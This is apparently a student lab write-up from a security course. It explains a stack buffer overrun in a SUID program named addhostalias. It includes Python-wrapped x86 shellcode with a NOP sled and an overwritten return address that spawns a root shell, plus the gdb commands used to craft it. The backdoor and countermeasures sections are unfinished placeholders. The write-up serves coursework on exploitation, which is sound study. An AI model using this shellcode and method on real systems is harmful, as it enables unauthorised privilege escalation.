# Language-based Security

## Lab 2 - Buffer Overruns

### Part 1 : Gaining root access

In order to gain root access to this machine, we are going to use the `addhostalias` executable file, which seems to be vulnerable to buffer overruns. In order to exploit this, we are going to go through several steps :
- analyse the vulnerability in the code
- use gdb to debug and analyse how the program behave
- find a way to exploit it, in our case we'll use Python which allow us to have our root shell more easily, since it's a high level language, we can focus on the content of our malicious code instead of how to generate it


Firstly let's have a brief explanation of how the stack works in this type of program. In order to maintain consistency during program execution, Linux OS 
```
       0x00000000

        4 bytes
< --------------------->


 ----------------------
|   RETURN ADRESS      | 
 ----------------------
|    BASE POINTER      |
 ---------------------- 
|                      |
|                      |
|                      |
|                      |
|                      |
|       STACK          |
|    (256 bytes)       |
|                      |
|                      |
|                      |
 ----------------------

       0xffffffff


```

```python
# run a shell on local machine
shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
             +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
             +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
             +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
             +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
             +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
             +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')


# NOP signal, tells the CPU to go to the next instruction
nop = '\x90'
nops = nop*181

# estimated area of the end of the stack
nop_adress = '\x10\xf9\xff\xbf'

# 181 + 75 + 2 + 4 = 262 + 2 characters in printf = 264 bytes of data (instead of 256, so it will overwrite base pointer and return address)
print nops+shellcode,nop*2,nop_adress


```

![How to use GDB to craft our exploit](/assets/lab2/gdb-demo.png)


```

 ----------------------
|   RETURN ADRESS      | <------- now redirects approximately to the end of the stack
 ----------------------
|    BASE POINTER      | <------- not important in our case, but it's now overwritten
 ---------------------- 
|                      |
|       MALICIOUS      |
|         CODE         |
|                      |
|         ...          |
|         NOP          |
|         NOP          |
|         NOP          |
 ----------------------

```

The SUID bit is set so the program is vulnerable

`addhostalias $(python gainr00t.py)`

allow gaining root access using our python script

`gdb --args addhostalias $(python -c 'print "\x41"*200') ttt ttt`

allow entering debugging mode

`(gdb) break fopen`

avoid having a permission denied. If we don't do that an error will occur during debugging.

`(gdb) run`

`(gdb) x/100x $sp`

This command displayed 100 words in our memory, allow to see pattern


### Part 2 : Create a Backdoor

lorem ipsum

### Part 3 : Countermeasures

- Canaries : ...
- NX bit : ...
- ASLR : ...


### Sources that helped us gaining root access on the machine

1. [Buffer Overflow Attack, Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo&t=589s)
2. [GDB Petit Tutoriel, Daniel Hirschkof](http://perso.ens-lyon.fr/daniel.hirschkoff/C_Caml/docs/doc_gdb.pdf)
3. [Le Débogueur GDB, Anne Canteaut](https://www.rocq.inria.fr/secret/Anne.Canteaut/COURS_C/gdb.html)






